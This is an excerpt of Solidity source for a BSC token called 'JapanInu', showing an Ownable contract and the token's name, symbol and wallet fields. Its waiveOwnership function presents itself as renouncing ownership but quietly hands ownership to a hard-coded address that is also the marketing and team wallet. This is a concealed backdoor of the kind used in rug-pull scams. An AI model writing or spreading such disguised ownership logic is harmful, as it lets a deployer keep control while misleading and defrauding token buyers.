...
/**
   JAPAN INU 
   Telegram: https://t.me/JapanInuBsc
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xd5AA6fd27b5a89E113724b7eCFcc2E6EcbC7045C));
        _owner = address(0xd5AA6fd27b5a89E113724b7eCFcc2E6EcbC7045C);
    }
...
contract JapanInu is Context, IERC20, Ownable {
    ...
    string private _name = "JapanInu";
    string private _symbol = "JAPAN INU ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xd5AA6fd27b5a89E113724b7eCFcc2E6EcbC7045C);
    address payable public teamWalletAddress = payable(0xd5AA6fd27b5a89E113724b7eCFcc2E6EcbC7045C);
